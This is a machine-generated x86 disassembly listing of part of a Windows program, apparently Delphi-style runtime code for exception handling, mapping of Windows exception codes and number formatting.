  4056ee:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4056f5:	b2 5c                	mov    $0x5c,%dl
  4056f7:	e8 b0 f6 ff ff       	call   0x404dac
  4056fc:	8b d0                	mov    %eax,%edx
  4056fe:	42                   	inc    %edx
  4056ff:	8b c4                	mov    %esp,%eax
  405701:	b9 3f 00 00 00       	mov    $0x3f,%ecx
  405706:	e8 4d f6 ff ff       	call   0x404d58
  40570b:	bb 44 58 40 00       	mov    $0x405844,%ebx
  405710:	bf 44 58 40 00       	mov    $0x405844,%edi
  405715:	8b c6                	mov    %esi,%eax
  405717:	ba 50 46 40 00       	mov    $0x404650,%edx
  40571c:	e8 4b d2 ff ff       	call   0x40296c
  405721:	84 c0                	test   %al,%al
  405723:	74 21                	je     0x405746
  405725:	8b 46 04             	mov    0x4(%esi),%eax
  405728:	e8 e7 dc ff ff       	call   0x403414
  40572d:	8b d8                	mov    %eax,%ebx
  40572f:	8b c3                	mov    %ebx,%eax
  405731:	e8 ce f5 ff ff       	call   0x404d04
  405736:	85 c0                	test   %eax,%eax
  405738:	74 0c                	je     0x405746
  40573a:	80 7c 03 ff 2e       	cmpb   $0x2e,-0x1(%ebx,%eax,1)
  40573f:	74 05                	je     0x405746
  405741:	bf 48 58 40 00       	mov    $0x405848,%edi
  405746:	6a 40                	push   $0x40
  405748:	8d 44 24 44          	lea    0x44(%esp),%eax
  40574c:	50                   	push   %eax
  40574d:	68 9e ff 00 00       	push   $0xff9e
  405752:	a1 14 c0 40 00       	mov    0x40c014,%eax
  405757:	50                   	push   %eax
  405758:	e8 ef ed ff ff       	call   0x40454c
  40575d:	6a 04                	push   $0x4
  40575f:	8d 94 24 ac 01 00 00 	lea    0x1ac(%esp),%edx
  405766:	8b 06                	mov    (%esi),%eax
  405768:	e8 ff d0 ff ff       	call   0x40286c
  40576d:	8d 84 24 ac 01 00 00 	lea    0x1ac(%esp),%eax
  405774:	89 84 24 84 01 00 00 	mov    %eax,0x184(%esp)
  40577b:	c6 84 24 88 01 00 00 	movb   $0x4,0x188(%esp)
  405782:	04 
  405783:	8d 44 24 04          	lea    0x4(%esp),%eax
  405787:	89 84 24 8c 01 00 00 	mov    %eax,0x18c(%esp)
  40578e:	c6 84 24 90 01 00 00 	movb   $0x6,0x190(%esp)
  405795:	06 
  405796:	8b c5                	mov    %ebp,%eax
  405798:	e8 1f ff ff ff       	call   0x4056bc
  40579d:	89 84 24 94 01 00 00 	mov    %eax,0x194(%esp)
  4057a4:	c6 84 24 98 01 00 00 	movb   $0x5,0x198(%esp)
  4057ab:	05 
  4057ac:	89 9c 24 9c 01 00 00 	mov    %ebx,0x19c(%esp)
  4057b3:	c6 84 24 a0 01 00 00 	movb   $0x6,0x1a0(%esp)
  4057ba:	06 
  4057bb:	89 bc 24 a4 01 00 00 	mov    %edi,0x1a4(%esp)
  4057c2:	c6 84 24 a8 01 00 00 	movb   $0x6,0x1a8(%esp)
  4057c9:	06 
  4057ca:	8d 8c 24 84 01 00 00 	lea    0x184(%esp),%ecx
  4057d1:	8d 54 24 44          	lea    0x44(%esp),%edx
  4057d5:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  4057dc:	e8 6f f9 ff ff       	call   0x405150
  4057e1:	6a 40                	push   $0x40
  4057e3:	8d 44 24 44          	lea    0x44(%esp),%eax
  4057e7:	50                   	push   %eax
  4057e8:	68 9f ff 00 00       	push   $0xff9f
  4057ed:	a1 14 c0 40 00       	mov    0x40c014,%eax
  4057f2:	50                   	push   %eax
  4057f3:	e8 54 ed ff ff       	call   0x40454c
  4057f8:	80 3d 31 c0 40 00 00 	cmpb   $0x0,0x40c031
  4057ff:	74 1d                	je     0x40581e
  405801:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  405808:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  40580d:	e8 d2 e7 ff ff       	call   0x403fe4
  405812:	e8 50 e7 ff ff       	call   0x403f67
  405817:	e8 38 ce ff ff       	call   0x402654
  40581c:	eb 19                	jmp    0x405837
  40581e:	68 10 20 00 00       	push   $0x2010
  405823:	8d 44 24 44          	lea    0x44(%esp),%eax
  405827:	50                   	push   %eax
  405828:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  40582f:	50                   	push   %eax
  405830:	6a 00                	push   $0x0
  405832:	e8 1d ed ff ff       	call   0x404554
  405837:	81 c4 a8 02 00 00    	add    $0x2a8,%esp
  40583d:	5d                   	pop    %ebp
  40583e:	5f                   	pop    %edi
  40583f:	5e                   	pop    %esi
  405840:	5b                   	pop    %ebx
  405841:	c3                   	ret
  405842:	00 00                	add    %al,(%eax)
  405844:	00 00                	add    %al,(%eax)
  405846:	00 00                	add    %al,(%eax)
  405848:	2e 00 00             	add    %al,%cs:(%eax)
  40584b:	00 8b 44 24 04 c3    	add    %cl,-0x3cfbdbbc(%ebx)
  405851:	8d 40 00             	lea    0x0(%eax),%eax
  405854:	e8 f3 ff ff ff       	call   0x40584c
  405859:	50                   	push   %eax
  40585a:	b9 9d ff 00 00       	mov    $0xff9d,%ecx
  40585f:	b2 01                	mov    $0x1,%dl
  405861:	b8 a0 46 40 00       	mov    $0x4046a0,%eax
  405866:	e8 c5 00 00 00       	call   0x405930
  40586b:	e9 44 d6 ff ff       	jmp    0x402eb4
  405870:	c3                   	ret
  405871:	8d 40 00             	lea    0x0(%eax),%eax
  405874:	a1 54 c5 40 00       	mov    0x40c554,%eax
  405879:	e8 36 d6 ff ff       	call   0x402eb4
  40587e:	c3                   	ret
  40587f:	90                   	nop
  405880:	53                   	push   %ebx
  405881:	56                   	push   %esi
  405882:	57                   	push   %edi
  405883:	84 d2                	test   %dl,%dl
  405885:	74 08                	je     0x40588f
  405887:	83 c4 f0             	add    $0xfffffff0,%esp
  40588a:	e8 39 d2 ff ff       	call   0x402ac8
  40588f:	8b f1                	mov    %ecx,%esi
  405891:	8b da                	mov    %edx,%ebx
  405893:	8b f8                	mov    %eax,%edi
  405895:	8d 47 04             	lea    0x4(%edi),%eax
  405898:	8b d6                	mov    %esi,%edx
  40589a:	e8 49 d9 ff ff       	call   0x4031e8
  40589f:	84 db                	test   %bl,%bl
  4058a1:	74 0a                	je     0x4058ad
  4058a3:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  4058aa:	83 c4 0c             	add    $0xc,%esp
  4058ad:	8b c7                	mov    %edi,%eax
  4058af:	5f                   	pop    %edi
  4058b0:	5e                   	pop    %esi
  4058b1:	5b                   	pop    %ebx
  4058b2:	c3                   	ret
  4058b3:	90                   	nop
  4058b4:	55                   	push   %ebp
  4058b5:	8b ec                	mov    %esp,%ebp
  4058b7:	6a 00                	push   $0x0
  4058b9:	53                   	push   %ebx
  4058ba:	56                   	push   %esi
  4058bb:	57                   	push   %edi
  4058bc:	84 d2                	test   %dl,%dl
  4058be:	74 08                	je     0x4058c8
  4058c0:	83 c4 f0             	add    $0xfffffff0,%esp
  4058c3:	e8 00 d2 ff ff       	call   0x402ac8
  4058c8:	8b f1                	mov    %ecx,%esi
  4058ca:	8b da                	mov    %edx,%ebx
  4058cc:	8b f8                	mov    %eax,%edi
  4058ce:	33 c0                	xor    %eax,%eax
  4058d0:	55                   	push   %ebp
  4058d1:	68 0e 59 40 00       	push   $0x40590e
  4058d6:	64 ff 30             	push   %fs:(%eax)
  4058d9:	64 89 20             	mov    %esp,%fs:(%eax)
  4058dc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4058df:	50                   	push   %eax
  4058e0:	8b 55 0c             	mov    0xc(%ebp),%edx
  4058e3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4058e6:	8b c6                	mov    %esi,%eax
  4058e8:	e8 97 f8 ff ff       	call   0x405184
  4058ed:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4058f0:	8d 47 04             	lea    0x4(%edi),%eax
  4058f3:	e8 f0 d8 ff ff       	call   0x4031e8
  4058f8:	33 c0                	xor    %eax,%eax
  4058fa:	5a                   	pop    %edx
  4058fb:	59                   	pop    %ecx
  4058fc:	59                   	pop    %ecx
  4058fd:	64 89 10             	mov    %edx,%fs:(%eax)
  405900:	68 15 59 40 00       	push   $0x405915
  405905:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405908:	e8 8b d8 ff ff       	call   0x403198
  40590d:	c3                   	ret
  40590e:	e9 e9 d4 ff ff       	jmp    0x402dfc
  405913:	eb f0                	jmp    0x405905
  405915:	84 db                	test   %bl,%bl
  405917:	74 0a                	je     0x405923
  405919:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  405920:	83 c4 0c             	add    $0xc,%esp
  405923:	8b c7                	mov    %edi,%eax
  405925:	5f                   	pop    %edi
  405926:	5e                   	pop    %esi
  405927:	5b                   	pop    %ebx
  405928:	59                   	pop    %ecx
  405929:	5d                   	pop    %ebp
  40592a:	c2 08 00             	ret    $0x8
  40592d:	8d 40 00             	lea    0x0(%eax),%eax
  405930:	55                   	push   %ebp
  405931:	8b ec                	mov    %esp,%ebp
  405933:	6a 00                	push   $0x0
  405935:	53                   	push   %ebx
  405936:	56                   	push   %esi
  405937:	57                   	push   %edi
  405938:	84 d2                	test   %dl,%dl
  40593a:	74 08                	je     0x405944
  40593c:	83 c4 f0             	add    $0xfffffff0,%esp
  40593f:	e8 84 d1 ff ff       	call   0x402ac8
  405944:	8b f1                	mov    %ecx,%esi
  405946:	8b da                	mov    %edx,%ebx
  405948:	8b f8                	mov    %eax,%edi
  40594a:	33 c0                	xor    %eax,%eax
  40594c:	55                   	push   %ebp
  40594d:	68 83 59 40 00       	push   $0x405983
  405952:	64 ff 30             	push   %fs:(%eax)
  405955:	64 89 20             	mov    %esp,%fs:(%eax)
  405958:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40595b:	8b c6                	mov    %esi,%eax
  40595d:	e8 6a f3 ff ff       	call   0x404ccc
  405962:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405965:	8d 47 04             	lea    0x4(%edi),%eax
  405968:	e8 7b d8 ff ff       	call   0x4031e8
  40596d:	33 c0                	xor    %eax,%eax
  40596f:	5a                   	pop    %edx
  405970:	59                   	pop    %ecx
  405971:	59                   	pop    %ecx
  405972:	64 89 10             	mov    %edx,%fs:(%eax)
  405975:	68 8a 59 40 00       	push   $0x40598a
  40597a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40597d:	e8 16 d8 ff ff       	call   0x403198
  405982:	c3                   	ret
  405983:	e9 74 d4 ff ff       	jmp    0x402dfc
  405988:	eb f0                	jmp    0x40597a
  40598a:	84 db                	test   %bl,%bl
  40598c:	74 0a                	je     0x405998
  40598e:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  405995:	83 c4 0c             	add    $0xc,%esp
  405998:	8b c7                	mov    %edi,%eax
  40599a:	5f                   	pop    %edi
  40599b:	5e                   	pop    %esi
  40599c:	5b                   	pop    %ebx
  40599d:	59                   	pop    %ecx
  40599e:	5d                   	pop    %ebp
  40599f:	c3                   	ret
  4059a0:	55                   	push   %ebp
  4059a1:	8b ec                	mov    %esp,%ebp
  4059a3:	6a 00                	push   $0x0
  4059a5:	6a 00                	push   $0x0
  4059a7:	53                   	push   %ebx
  4059a8:	56                   	push   %esi
  4059a9:	57                   	push   %edi
  4059aa:	84 d2                	test   %dl,%dl
  4059ac:	74 08                	je     0x4059b6
  4059ae:	83 c4 f0             	add    $0xfffffff0,%esp
  4059b1:	e8 12 d1 ff ff       	call   0x402ac8
  4059b6:	8b f1                	mov    %ecx,%esi
  4059b8:	8b da                	mov    %edx,%ebx
  4059ba:	8b f8                	mov    %eax,%edi
  4059bc:	33 c0                	xor    %eax,%eax
  4059be:	55                   	push   %ebp
  4059bf:	68 0c 5a 40 00       	push   $0x405a0c
  4059c4:	64 ff 30             	push   %fs:(%eax)
  4059c7:	64 89 20             	mov    %esp,%fs:(%eax)
  4059ca:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4059cd:	50                   	push   %eax
  4059ce:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4059d1:	8b c6                	mov    %esi,%eax
  4059d3:	e8 f4 f2 ff ff       	call   0x404ccc
  4059d8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4059db:	8b 55 0c             	mov    0xc(%ebp),%edx
  4059de:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4059e1:	e8 9e f7 ff ff       	call   0x405184
  4059e6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4059e9:	8d 47 04             	lea    0x4(%edi),%eax
  4059ec:	e8 f7 d7 ff ff       	call   0x4031e8
  4059f1:	33 c0                	xor    %eax,%eax
  4059f3:	5a                   	pop    %edx
  4059f4:	59                   	pop    %ecx
  4059f5:	59                   	pop    %ecx
  4059f6:	64 89 10             	mov    %edx,%fs:(%eax)
  4059f9:	68 13 5a 40 00       	push   $0x405a13
  4059fe:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405a01:	ba 02 00 00 00       	mov    $0x2,%edx
  405a06:	e8 ad d7 ff ff       	call   0x4031b8
  405a0b:	c3                   	ret
  405a0c:	e9 eb d3 ff ff       	jmp    0x402dfc
  405a11:	eb eb                	jmp    0x4059fe
  405a13:	84 db                	test   %bl,%bl
  405a15:	74 0a                	je     0x405a21
  405a17:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  405a1e:	83 c4 0c             	add    $0xc,%esp
  405a21:	8b c7                	mov    %edi,%eax
  405a23:	5f                   	pop    %edi
  405a24:	5e                   	pop    %esi
  405a25:	5b                   	pop    %ebx
  405a26:	59                   	pop    %ecx
  405a27:	59                   	pop    %ecx
  405a28:	5d                   	pop    %ebp
  405a29:	c2 08 00             	ret    $0x8
  405a2c:	84 d2                	test   %dl,%dl
  405a2e:	74 05                	je     0x405a35
  405a30:	e8 cf d0 ff ff       	call   0x402b04
  405a35:	c3                   	ret
  405a36:	8b c0                	mov    %eax,%eax
  405a38:	c3                   	ret
  405a39:	8d 40 00             	lea    0x0(%eax),%eax
  405a3c:	53                   	push   %ebx
  405a3d:	83 c4 f8             	add    $0xfffffff8,%esp
  405a40:	33 db                	xor    %ebx,%ebx
  405a42:	eb 01                	jmp    0x405a45
  405a44:	43                   	inc    %ebx
  405a45:	83 fb 06             	cmp    $0x6,%ebx
  405a48:	7f 14                	jg     0x405a5e
  405a4a:	e8 05 d7 ff ff       	call   0x403154
  405a4f:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  405a55:	3b 04 dd 80 b0 40 00 	cmp    0x40b080(,%ebx,8),%eax
  405a5c:	75 e6                	jne    0x405a44
  405a5e:	83 fb 06             	cmp    $0x6,%ebx
  405a61:	7f 17                	jg     0x405a7a
  405a63:	8b 0c dd 84 b0 40 00 	mov    0x40b084(,%ebx,8),%ecx
  405a6a:	b2 01                	mov    $0x1,%dl
  405a6c:	b8 20 47 40 00       	mov    $0x404720,%eax
  405a71:	e8 ba fe ff ff       	call   0x405930
  405a76:	8b d8                	mov    %eax,%ebx
  405a78:	eb 29                	jmp    0x405aa3
  405a7a:	e8 d5 d6 ff ff       	call   0x403154
  405a7f:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  405a85:	89 04 24             	mov    %eax,(%esp)
  405a88:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  405a8d:	54                   	push   %esp
  405a8e:	6a 00                	push   $0x0
  405a90:	b9 88 ff 00 00       	mov    $0xff88,%ecx
  405a95:	b2 01                	mov    $0x1,%dl
  405a97:	b8 20 47 40 00       	mov    $0x404720,%eax
  405a9c:	e8 ff fe ff ff       	call   0x4059a0
  405aa1:	8b d8                	mov    %eax,%ebx
  405aa3:	e8 ac d6 ff ff       	call   0x403154
  405aa8:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  405aae:	89 43 0c             	mov    %eax,0xc(%ebx)
  405ab1:	e8 9e d6 ff ff       	call   0x403154
  405ab6:	33 d2                	xor    %edx,%edx
  405ab8:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  405abe:	8b c3                	mov    %ebx,%eax
  405ac0:	59                   	pop    %ecx
  405ac1:	5a                   	pop    %edx
  405ac2:	5b                   	pop    %ebx
  405ac3:	c3                   	ret
  405ac4:	53                   	push   %ebx
  405ac5:	8b da                	mov    %edx,%ebx
  405ac7:	8b d0                	mov    %eax,%edx
  405ac9:	4a                   	dec    %edx
  405aca:	74 08                	je     0x405ad4
  405acc:	4a                   	dec    %edx
  405acd:	83 ea 13             	sub    $0x13,%edx
  405ad0:	72 09                	jb     0x405adb
  405ad2:	eb 1c                	jmp    0x405af0
  405ad4:	a1 54 c5 40 00       	mov    0x40c554,%eax
  405ad9:	eb 1a                	jmp    0x405af5
  405adb:	8d 04 c5 a8 b0 40 00 	lea    0x40b0a8(,%eax,8),%eax
  405ae2:	8b 48 04             	mov    0x4(%eax),%ecx
  405ae5:	b2 01                	mov    $0x1,%dl
  405ae7:	8b 00                	mov    (%eax),%eax
  405ae9:	e8 42 fe ff ff       	call   0x405930
  405aee:	eb 05                	jmp    0x405af5
  405af0:	e8 47 ff ff ff       	call   0x405a3c
  405af5:	53                   	push   %ebx
  405af6:	e9 b9 d3 ff ff       	jmp    0x402eb4
  405afb:	5b                   	pop    %ebx
  405afc:	c3                   	ret
  405afd:	8d 40 00             	lea    0x0(%eax),%eax
  405b00:	8b 00                	mov    (%eax),%eax
  405b02:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  405b07:	7f 2c                	jg     0x405b35
  405b09:	74 59                	je     0x405b64
  405b0b:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  405b10:	7f 15                	jg     0x405b27
  405b12:	74 53                	je     0x405b67
  405b14:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  405b19:	74 55                	je     0x405b70
  405b1b:	2d 87 00 00 00       	sub    $0x87,%eax
  405b20:	74 3c                	je     0x405b5e
  405b22:	48                   	dec    %eax
  405b23:	74 48                	je     0x405b6d
  405b25:	eb 55                	jmp    0x405b7c
  405b27:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  405b2c:	83 e8 02             	sub    $0x2,%eax
  405b2f:	72 33                	jb     0x405b64
  405b31:	74 37                	je     0x405b6a
  405b33:	eb 47                	jmp    0x405b7c
  405b35:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  405b3a:	7f 11                	jg     0x405b4d
  405b3c:	74 35                	je     0x405b73
  405b3e:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  405b43:	74 28                	je     0x405b6d
  405b45:	48                   	dec    %eax
  405b46:	74 13                	je     0x405b5b
  405b48:	48                   	dec    %eax
  405b49:	74 16                	je     0x405b61
  405b4b:	eb 2f                	jmp    0x405b7c
  405b4d:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  405b52:	74 25                	je     0x405b79
  405b54:	83 e8 3d             	sub    $0x3d,%eax
  405b57:	74 1d                	je     0x405b76
  405b59:	eb 21                	jmp    0x405b7c
  405b5b:	b0 03                	mov    $0x3,%al
  405b5d:	c3                   	ret
  405b5e:	b0 04                	mov    $0x4,%al
  405b60:	c3                   	ret
  405b61:	b0 05                	mov    $0x5,%al
  405b63:	c3                   	ret
  405b64:	b0 06                	mov    $0x6,%al
  405b66:	c3                   	ret
  405b67:	b0 07                	mov    $0x7,%al
  405b69:	c3                   	ret
  405b6a:	b0 08                	mov    $0x8,%al
  405b6c:	c3                   	ret
  405b6d:	b0 09                	mov    $0x9,%al
  405b6f:	c3                   	ret
  405b70:	b0 0b                	mov    $0xb,%al
  405b72:	c3                   	ret
  405b73:	b0 0c                	mov    $0xc,%al
  405b75:	c3                   	ret
  405b76:	b0 0d                	mov    $0xd,%al
  405b78:	c3                   	ret
  405b79:	b0 0e                	mov    $0xe,%al
  405b7b:	c3                   	ret
  405b7c:	b0 15                	mov    $0x15,%al
  405b7e:	c3                   	ret
  405b7f:	90                   	nop
  405b80:	e8 7b ff ff ff       	call   0x405b00
  405b85:	25 ff 00 00 00       	and    $0xff,%eax
  405b8a:	8b 04 c5 a8 b0 40 00 	mov    0x40b0a8(,%eax,8),%eax
  405b91:	c3                   	ret
  405b92:	8b c0                	mov    %eax,%eax
  405b94:	55                   	push   %ebp
  405b95:	8b ec                	mov    %esp,%ebp
  405b97:	83 c4 dc             	add    $0xffffffdc,%esp
  405b9a:	53                   	push   %ebx
  405b9b:	56                   	push   %esi
  405b9c:	57                   	push   %edi
  405b9d:	33 d2                	xor    %edx,%edx
  405b9f:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405ba2:	8b d8                	mov    %eax,%ebx
  405ba4:	33 c0                	xor    %eax,%eax
  405ba6:	55                   	push   %ebp
  405ba7:	68 77 5c 40 00       	push   $0x405c77
  405bac:	64 ff 30             	push   %fs:(%eax)
  405baf:	64 89 20             	mov    %esp,%fs:(%eax)
  405bb2:	8b c3                	mov    %ebx,%eax
  405bb4:	e8 47 ff ff ff       	call   0x405b00
  405bb9:	25 ff 00 00 00       	and    $0xff,%eax
  405bbe:	8b d0                	mov    %eax,%edx
  405bc0:	83 c2 fd             	add    $0xfffffffd,%edx
  405bc3:	83 ea 08             	sub    $0x8,%edx
  405bc6:	72 08                	jb     0x405bd0
  405bc8:	74 1d                	je     0x405be7
  405bca:	4a                   	dec    %edx
  405bcb:	83 ea 09             	sub    $0x9,%edx
  405bce:	73 6c                	jae    0x405c3c
  405bd0:	8d 04 c5 a8 b0 40 00 	lea    0x40b0a8(,%eax,8),%eax
  405bd7:	8b 48 04             	mov    0x4(%eax),%ecx
  405bda:	8b 00                	mov    (%eax),%eax
  405bdc:	b2 01                	mov    $0x1,%dl
  405bde:	e8 4d fd ff ff       	call   0x405930
  405be3:	8b f0                	mov    %eax,%esi
  405be5:	eb 7a                	jmp    0x405c61
  405be7:	83 7b 14 00          	cmpl   $0x0,0x14(%ebx)
  405beb:	75 07                	jne    0x405bf4
  405bed:	be a5 ff 00 00       	mov    $0xffa5,%esi
  405bf2:	eb 05                	jmp    0x405bf9
  405bf4:	be a6 ff 00 00       	mov    $0xffa6,%esi
  405bf9:	8b 7b 18             	mov    0x18(%ebx),%edi
  405bfc:	8b 43 0c             	mov    0xc(%ebx),%eax
  405bff:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405c02:	c6 45 ec 05          	movb   $0x5,-0x14(%ebp)
  405c06:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  405c09:	8b c6                	mov    %esi,%eax
  405c0b:	e8 bc f0 ff ff       	call   0x404ccc
  405c10:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405c13:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405c16:	c6 45 f4 0b          	movb   $0xb,-0xc(%ebp)
  405c1a:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405c1d:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  405c21:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405c24:	50                   	push   %eax
  405c25:	6a 02                	push   $0x2
  405c27:	b9 99 ff 00 00       	mov    $0xff99,%ecx
  405c2c:	b2 01                	mov    $0x1,%dl
  405c2e:	b8 70 4a 40 00       	mov    $0x404a70,%eax
  405c33:	e8 68 fd ff ff       	call   0x4059a0
  405c38:	8b f0                	mov    %eax,%esi
  405c3a:	eb 25                	jmp    0x405c61
  405c3c:	8b 03                	mov    (%ebx),%eax
  405c3e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  405c41:	c6 45 e0 00          	movb   $0x0,-0x20(%ebp)
  405c45:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405c48:	50                   	push   %eax
  405c49:	6a 00                	push   $0x0
  405c4b:	b9 ac ff 00 00       	mov    $0xffac,%ecx
  405c50:	b2 01                	mov    $0x1,%dl
  405c52:	b8 c0 4b 40 00       	mov    $0x404bc0,%eax
  405c57:	e8 44 fd ff ff       	call   0x4059a0
  405c5c:	8b f0                	mov    %eax,%esi
  405c5e:	89 5e 0c             	mov    %ebx,0xc(%esi)
  405c61:	33 c0                	xor    %eax,%eax
  405c63:	5a                   	pop    %edx
  405c64:	59                   	pop    %ecx
  405c65:	59                   	pop    %ecx
  405c66:	64 89 10             	mov    %edx,%fs:(%eax)
  405c69:	68 7e 5c 40 00       	push   $0x405c7e
  405c6e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405c71:	e8 22 d5 ff ff       	call   0x403198
  405c76:	c3                   	ret
  405c77:	e9 80 d1 ff ff       	jmp    0x402dfc
  405c7c:	eb f0                	jmp    0x405c6e
  405c7e:	8b c6                	mov    %esi,%eax
  405c80:	5f                   	pop    %edi
  405c81:	5e                   	pop    %esi
  405c82:	5b                   	pop    %ebx
  405c83:	8b e5                	mov    %ebp,%esp
  405c85:	5d                   	pop    %ebp
  405c86:	c3                   	ret
  405c87:	90                   	nop
  405c88:	e8 3b fa ff ff       	call   0x4056c8
  405c8d:	b8 01 00 00 00       	mov    $0x1,%eax
  405c92:	e8 99 e1 ff ff       	call   0x403e30
  405c97:	c3                   	ret
  405c98:	b9 87 ff 00 00       	mov    $0xff87,%ecx
  405c9d:	b2 01                	mov    $0x1,%dl
  405c9f:	b8 dc 46 40 00       	mov    $0x4046dc,%eax
  405ca4:	e8 87 fc ff ff       	call   0x405930
  405ca9:	a3 54 c5 40 00       	mov    %eax,0x40c554
  405cae:	c7 05 04 c0 40 00 c4 	movl   $0x405ac4,0x40c004
  405cb5:	5a 40 00 
  405cb8:	c7 05 00 c0 40 00 88 	movl   $0x405c88,0x40c000
  405cbf:	5c 40 00 
  405cc2:	b8 50 46 40 00       	mov    $0x404650,%eax
  405cc7:	a3 10 c0 40 00       	mov    %eax,0x40c010
  405ccc:	c7 05 08 c0 40 00 80 	movl   $0x405b80,0x40c008
  405cd3:	5b 40 00 
  405cd6:	c7 05 0c c0 40 00 94 	movl   $0x405b94,0x40c00c
  405cdd:	5b 40 00 
  405ce0:	c3                   	ret
  405ce1:	8d 40 00             	lea    0x0(%eax),%eax
  405ce4:	81 c4 6c ff ff ff    	add    $0xffffff6c,%esp
  405cea:	c7 04 24 94 00 00 00 	movl   $0x94,(%esp)
  405cf1:	54                   	push   %esp
  405cf2:	e8 8d e7 ff ff       	call   0x404484
  405cf7:	85 c0                	test   %eax,%eax
  405cf9:	74 09                	je     0x405d04
  405cfb:	8b 44 24 10          	mov    0x10(%esp),%eax
  405cff:	a3 7c b0 40 00       	mov    %eax,0x40b07c
  405d04:	81 c4 94 00 00 00    	add    $0x94,%esp
  405d0a:	c3                   	ret
  405d0b:	90                   	nop
  405d0c:	0a 00                	or     (%eax),%al
  405d0e:	00 00                	add    %al,(%eax)
  405d10:	64 00 00             	add    %al,%fs:(%eax)
  405d13:	00 e8                	add    %ch,%al
  405d15:	03 00                	add    (%eax),%eax
  405d17:	00 10                	add    %dl,(%eax)
  405d19:	27                   	daa
  405d1a:	00 00                	add    %al,(%eax)
  405d1c:	00 00                	add    %al,(%eax)
  405d1e:	40                   	inc    %eax
  405d1f:	76 3a                	jbe    0x405d5b
  405d21:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  405d24:	3a 40 3f             	cmp    0x3f(%eax),%al
  405d27:	13 49 4e             	adc    0x4e(%ecx),%ecx
  405d2a:	46                   	inc    %esi
  405d2b:	4e                   	dec    %esi
  405d2c:	41                   	inc    %ecx
  405d2d:	4e                   	dec    %esi
  405d2e:	55                   	push   %ebp
  405d2f:	8b ec                	mov    %esp,%ebp
  405d31:	83 ec 1c             	sub    $0x1c,%esp
  405d34:	57                   	push   %edi
  405d35:	56                   	push   %esi
  405d36:	53                   	push   %ebx
  405d37:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d3a:	b8 13 00 00 00       	mov    $0x13,%eax
  405d3f:	80 f9 00             	cmp    $0x0,%cl
  405d42:	75 17                	jne    0x405d5b
  405d44:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d47:	83 f8 02             	cmp    $0x2,%eax
  405d4a:	7d 05                	jge    0x405d51
  405d4c:	b8 02 00 00 00       	mov    $0x2,%eax
  405d51:	83 f8 12             	cmp    $0x12,%eax
  405d54:	7e 05                	jle    0x405d5b
  405d56:	b8 12 00 00 00       	mov    $0x12,%eax
  405d5b:	89 45 0c             	mov    %eax,0xc(%ebp)
  405d5e:	50                   	push   %eax
  405d5f:	b8 0f 27 00 00       	mov    $0x270f,%eax
  405d64:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  405d68:	72 03                	jb     0x405d6d
  405d6a:	8b 45 08             	mov    0x8(%ebp),%eax
  405d6d:	50                   	push   %eax
  405d6e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405d71:	e8 54 05 00 00       	call   0x4062ca
  405d76:	8b 7d fc             	mov    -0x4(%ebp),%edi
  405d79:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  405d7d:	2d ff 7f 00 00       	sub    $0x7fff,%eax
  405d82:	83 f8 02             	cmp    $0x2,%eax
  405d85:	73 10                	jae    0x405d97
  405d87:	8d b4 40 28 5d 40 00 	lea    0x405d28(%eax,%eax,2),%esi
  405d8e:	b9 03 00 00 00       	mov    $0x3,%ecx
  405d93:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405d95:	eb 23                	jmp    0x405dba
  405d97:	8d 75 e7             	lea    -0x19(%ebp),%esi
  405d9a:	0f b6 5d 10          	movzbl 0x10(%ebp),%ebx
  405d9e:	80 fb 01             	cmp    $0x1,%bl
  405da1:	74 10                	je     0x405db3
  405da3:	80 fb 04             	cmp    $0x4,%bl
  405da6:	77 09                	ja     0x405db1
  405da8:	0f bf 45 e4          	movswl -0x1c(%ebp),%eax
  405dac:	3b 45 0c             	cmp    0xc(%ebp),%eax
  405daf:	7e 02                	jle    0x405db3
